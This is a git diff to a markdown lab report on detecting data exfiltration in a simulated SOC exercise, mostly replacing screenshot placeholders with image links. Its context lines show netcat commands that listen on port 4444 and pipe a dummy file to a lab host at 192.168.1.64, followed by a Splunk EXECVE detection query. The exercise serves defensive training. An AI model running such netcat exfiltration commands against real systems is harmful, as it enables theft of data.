@@ -1,4 +1,4 @@
-# SOC Investigation Report — Data Exfiltration Detection
+# Data Exfiltration Detection
  
 ## Objective
  
@@ -38,9 +38,6 @@ The attacker simulated data exfiltration through:
 ```bash
 dd if=/dev/urandom of=secret_data.bin bs=1M count=50
 ```
- 
-> **Screenshot 1 — File Creation** *(Upload screenshot — dd command output)*
- 
 ---
  
 ### Step 2 — Attacker Listener (Kali)
@@ -49,7 +46,7 @@ dd if=/dev/urandom of=secret_data.bin bs=1M count=50
 nc -lvnp 4444 >> stolen_data.bin
 ```
  
-> **Screenshot 2 — Listener + Connections** *(Upload screenshot — Kali multiple connections)*
+![Ubuntu Logs](images/kalide.png)
  
 ---
  
@@ -61,7 +58,7 @@ cat secret_data.bin | nc -q 1 192.168.1.64 4444
  
 > Repeated multiple times for continuous exfiltration
  
-> **Screenshot 3 — Exfiltration Command** *(Upload screenshot — Ubuntu terminal commands)*
+![Ubuntu Logs](images/ubuntude.png)
  
 ---
  
@@ -73,7 +70,7 @@ ls -lh stolen_data.bin
  
 **Output:** `150M stolen_data.bin`
  
-> **Screenshot 4 — Exfiltrated File** *(Upload screenshot — 150MB file proof)*
+![Ubuntu Logs](images/kalide.png)
  
 ---
  
@@ -85,8 +82,7 @@ ls -lh stolen_data.bin
 index=main sourcetype=linux_audit "EXECVE"
 | table _time host a0 a1 a2 uid
 ```
- 
-> **Screenshot 5 — Splunk EXECVE Detection** *(Upload screenshot — Splunk EXECVE table)*
+![Ubuntu Logs](images/splunkde.png)
  
 ---
  
